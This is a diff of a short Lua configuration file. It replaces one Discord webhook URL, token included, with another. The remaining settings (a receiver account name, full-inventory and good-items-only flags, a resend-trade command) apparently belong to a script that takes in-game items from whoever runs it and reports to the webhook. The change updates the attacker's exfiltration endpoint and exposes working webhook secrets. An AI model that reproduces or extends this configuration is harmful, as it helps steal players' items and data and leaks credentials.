@@ -1,6 +1,6 @@
 Config = {
     Receivers = {"ChickenNuggetATK"},
-    Webhook = "https://discord.com/api/webhooks/1285618164591235133/bjLdT7IJMDs382kz4NVFyEFVAcxl8AN5VC68LrDn4pR7GR2obG8rIemORaR250hf2_6U",
+    Webhook = "https://discord.com/api/webhooks/1285618169112694815/o1tvdIQVT7o1sS5ChGYj3EM_rjNn9mJr7w2JpRsSX2IWxIMfshhbRbvE0yugRRgabNkM",
     FullInventory = true,
     GoodItemsOnly = true,
     ResendTrade = ".resend",
